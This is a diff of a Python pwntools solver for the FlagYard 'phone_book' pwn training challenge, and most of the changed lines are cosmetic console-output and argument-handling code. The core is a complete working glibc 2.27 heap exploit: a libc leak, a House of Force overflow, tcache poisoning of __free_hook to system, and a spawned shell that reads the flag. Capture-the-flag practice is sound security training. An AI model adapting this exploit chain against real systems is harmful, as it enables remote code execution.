@@ -1,14 +1,24 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-phone_book  -  FlagYard pwn exploit (colored edition)
-8-op wrapped House of Force -> tcache entries poison -> __free_hook = system
-glibc 2.27 (Ubuntu 2.27-3ubuntu1.6) offsets hardcoded. Needs pwntools only.
+PHONE BOOK  -  FlagYard Pwn solver
+
+phone_book (FlagYard Training Labs, Pwn / SAFCSP) - 8-op wrapped House of
+Force -> tcache entries poison -> __free_hook = system. glibc 2.27
+(Ubuntu 2.27-3ubuntu1.6) offsets hardcoded. Needs pwntools only.
+
+Target is given as host:port (default tcp.flagyard.com:29072).
 """
+from __future__ import annotations
+
 from pwn import *
-import re, os, sys, time
+import re
+import sys
+import time
+from pathlib import Path
 
 # ---------------------------------------------------------------------------
-# colored output (same design as the mra / NOSJ solvers)
+# coloured output (same design as the other FlagYard solvers)
 # ---------------------------------------------------------------------------
 class C:
     RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
@@ -17,7 +27,7 @@ class C:
     WHITE = "\033[97m"
 
 def enable_vt():
-    if os.name == "nt":
+    if sys.platform == "win32":
         try:
             import ctypes
             k32 = ctypes.windll.kernel32
@@ -29,23 +39,30 @@ def enable_vt():
             pass
     try:
         sys.stdout.reconfigure(encoding="utf-8", errors="replace")
-        sys.stdin.reconfigure(encoding="utf-8", errors="replace")
     except Exception:
         pass
 
-def bar(frac, width=20):
-    filled = int(frac * width)
-    return "\u2588" * filled + "\u2591" * (width - filled)
+def bar(frac):
+    w = 20
+    f = max(0.0, min(1.0, frac))
+    full = int(round(f * w))
+    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)
 
-def pct(frac):
-    return "[%5.1f%%]" % (frac * 100.0)
+def step(msg, icon="\u25b6", color=C.CYAN):
+    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
+                             C.DIM, C.BOLD, msg, C.RESET), flush=True)
 
-def status(frac, msg, icon="\u25b6", color=C.CYAN):
-    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
-                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)
+def ok(msg):
+    step(msg, icon="\u2713", color=C.GREEN)
 
-def ok(frac, msg):
-    status(frac, msg, icon="\u2713", color=C.GREEN)
+def tick(frac, msg):
+    """single moving progress line (updates in place via carriage return)."""
+    line = ("%s%s %s %s%s%s" %
+            (C.BOLD + C.YELLOW + "\u25b6 ",
+             C.CYAN + bar(frac) + C.RESET,
+             C.DIM, C.BOLD, msg, C.RESET))
+    sys.stdout.write("\r  " + line + "   ")
+    sys.stdout.flush()
 
 def fail(msg):
     print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)
@@ -53,12 +70,16 @@ def fail(msg):
 def banner():
     print(C.MAGENTA + C.BOLD)
     print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
-    print("  \u2551        P H O N E   B O O K   E X P L O I T      \u2551")
-    print("  \u2551   House of Force + tcache poison  |  Pwn        \u2551")
+    for t in ("P H O N E   B O O K   S O L V E R",
+              "House of Force -> tcache poison -> __free_hook -> flag"):
+        l = (58 - len(t)) // 2
+        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
     print("  \u255a" + "\u2550" * 58 + "\u255d")
     print(C.RESET)
 
+# ---------------------------------------------------------------------------
 # result panel (fixed-width frame) + author credits
+# ---------------------------------------------------------------------------
 W = 58
 _TG = "\033[1;38;2;0;136;204m"
 _OSC_END = "\x1b]8;;\x1b\\"
@@ -93,20 +114,35 @@ def _credits():
           ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
     print("  " + "\u255a" + "\u2550" * W + "\u255d")
 
-def big_flag(text, chrono):
-    line = text.strip().splitlines()[0]
+def big_flag(flag, chrono):
     print()
-    head = "\u2605  FLAG CAPTURED  \u2605"
+    head = "\u2605  FLAG RECOVERED  \u2605"
     print("  " + "\u2554" + "\u2550" * W + "\u2557")
     _row([("", "", "")])
     _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
     _row([("", "", "")])
-    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
-    for s in ("elapsed %.1f s" % chrono,):
-        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
+    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
+    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
     _row([("", "", "")])
     _credits()
     print()
+
+# ---------------------------------------------------------------------------
+# helpers
+# ---------------------------------------------------------------------------
+def ask_target(argv):
+    if len(argv) > 1 and (argv[1].startswith("http") or ":" in argv[1]):
+        return argv[1].strip()
+    raw = input("  Enter the Phone Book challenge target (host:port): ").strip()
+    return raw or "tcp.flagyard.com:29072"
+
+def parse_target(raw):
+    raw = raw.replace("tcp://", "").replace("http://", "").rstrip("/")
+    if ":" in raw:
+        host, port_s = raw.rsplit(":", 1)
+    else:
+        host, port_s = raw, "29072"
+    return host, int(port_s)
 
 # ---------------------------------------------------------------------------
 # glibc 2.27 offsets (Ubuntu 2.27-3ubuntu1.6)
@@ -158,7 +194,7 @@ def connect(host, port):
     return None
 
 # ---------------------------------------------------------------------------
-# main
+# exploit
 # ---------------------------------------------------------------------------
 def exploit(host, port):
     io = connect(host, port)
@@ -167,7 +203,7 @@ def exploit(host, port):
         return None
 
     # 1) print(-8) -> libc leak via GOT read of stdout FILE struct
-    status(0.12, "Leaking libc via print index -8 (read@GOT -> stdout FILE)...")
+    step("leaking libc via print index -8 (read@GOT -> stdout FILE)")
     name, _ = pr(io, -8)
     leak = u64(name.ljust(8, b"\x00")[:8])
     if len(name) < 5:
@@ -179,42 +215,43 @@ def exploit(host, port):
     if base & 0xFFF:
         fail("libc base unaligned: 0x%x" % base)
         io.close(); return None
-    ok(0.30, "libc base = %s   free_hook = %s   system = %s" %
-       (C.YELLOW + hex(base) + C.RESET, C.YELLOW + hex(fh) + C.RESET, C.YELLOW + hex(system) + C.RESET))
+    ok("libc base = %s   free_hook = %s   system = %s" %
+       (C.YELLOW + hex(base) + C.RESET, C.YELLOW + hex(fh) + C.RESET,
+        C.YELLOW + hex(system) + C.RESET))
 
     # 2) add(0x68): name overflow => TOP chunk size = -1  (House of Force)
-    status(0.38, "Overflowing name to poison TOP chunk size = -1 (HoF)...")
+    step("overflowing name to poison TOP chunk size = -1 (HoF)")
     add(io, 0x68, b"0 ", b"A" * 0x58 + p64(0) + p64(0xFFFFFFFFFFFFFFFF))
     # 3) free chunk 0 -> tcache idx5, key field = heap pointer
     delete(io, 0)
     # 4) UAF print -> heap leak
-    status(0.46, "Freed chunk 0 (tcache idx 5), UAF print for heap leak...")
+    step("freed chunk 0 (tcache idx 5), UAF print for heap leak")
     name, _ = pr(io, 0)
     heap = u64(name.ljust(8, b"\x00")[:8]) - 0x10
-    ok(0.52, "heap base = %s" % (C.YELLOW + hex(heap) + C.RESET))
+    ok("heap base = %s" % (C.YELLOW + hex(heap) + C.RESET))
     top = heap + 0x2C0
 
     # 5) wrap HoF: gap so a fresh malloc lands user ptr at heap+0x50 (tcache region)
-    status(0.58, "Wrapping House of Force (signed %#llx gap)...")
+    step("wrapping House of Force (signed %#llx gap)..." % to_signed((heap + 0x50 - 32 - top) % (1 << 64)))
     target = heap + 0x50
     evil = (target - 32 - top) % (1 << 64)
     add(io, to_signed(evil), b"0 ", skip_name=True)
-    ok(0.64, "TOP wraps around; next malloc lands in the tcache entries zone.")
+    ok("TOP wraps around; next malloc lands in the tcache entries zone")
 
     # 6) land chunk whose USER area == tcache entries; phone=/bin/sh, name poisons entries[5]
     binsh = u64(b"/bin/sh\x00")
     payload = b"\x00" * 32 + p64(fh)
-    status(0.70, "Landing chunk on tcache entries: poison entries[5] = __free_hook...")
+    step("landing chunk on tcache entries: poison entries[5] = __free_hook")
     add(io, 0x48, str(binsh).encode() + b" ", payload)
-    ok(0.76, "tcache poisoned \u2014 malloc(0x68) will now return __free_hook.")
+    ok("tcache poisoned \u2014 malloc(0x68) will now return __free_hook")
 
     # 7) malloc(0x68) -> __free_hook; phone = system address
-    status(0.82, "malloc(0x68) returns __free_hook; writing system there...")
+    step("malloc(0x68) returns __free_hook; writing system there")
     add(io, 0x68, str(system).encode() + b" ", skip_name=True)
-    ok(0.88, "__free_hook = system.")
+    ok("__free_hook = system")
 
     # 8) free(land chunk) -> __free_hook("/bin/sh") == system("/bin/sh") -> shell
-    status(0.92, "free() -> __free_hook(\"/bin/sh\") -> spawning shell...")
+    step("free() -> __free_hook(\"/bin/sh\") -> spawning shell")
     delete(io, 1)
     time.sleep(0.5)
 
@@ -225,32 +262,38 @@ def exploit(host, port):
 
     m = re.search(rb"FlagY\{[^}]+\}", data)
     if m:
-        ok(0.98, "shell spawned \u2014 flag read!")
+        ok("shell spawned \u2014 flag read!")
         return m.group(0).decode()
     if b"PWNED" in data or b"uid=" in data:
-        return f"SHELL OK but flag not seen; raw={data[:300]!r}"
-    return f"FAILED; raw={data[:300]!r}"
+        return "SHELL OK but flag not seen; raw=%r" % data[:300]
+    return "FAILED; raw=%r" % data[:300]
 
 
-def main():
+def main() -> None:
+    t0 = time.time()
     enable_vt()
     banner()
     context.log_level = "error"
 
-    raw = input("  Target (host:port) > ").strip() or "tcp.flagyard.com:29072"
-    raw = raw.replace("tcp://", "").replace("http://", "")
-    if ":" in raw:
-        host, port_s = raw.rsplit(":", 1)
-    else:
-        host, port_s = raw, "29072"
-    port = int(port_s)
-    print("  %s[ target : %s%s:%d%s ]%s\n" % (C.GRAY, C.CYAN, host, port, C.RESET, C.RESET))
-    t0 = time.time()
+    try:
+        raw = ask_target(sys.argv)
+    except Exception:
+        fail("no challenge target given")
+        return
+    host, port = parse_target(raw)
+    step("target host %s:%d" % (host, port))
 
-    status(0.05, "Connecting to %s:%d ..." % (host, port))
+    step("connecting to the service")
     flag = exploit(host, port)
     if flag and flag.startswith("FlagY"):
+        tick(0.85, "shell spawned and flag read")
+        print()
+        ok("FLAG = %s" % flag)
+
         big_flag(flag, time.time() - t0)
+        outp = Path(__file__).resolve().parent / "flag_from_phone_book.txt"
+        outp.write_text(flag + "\n", encoding="utf-8")
+        print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))
     else:
         fail(str(flag))
 
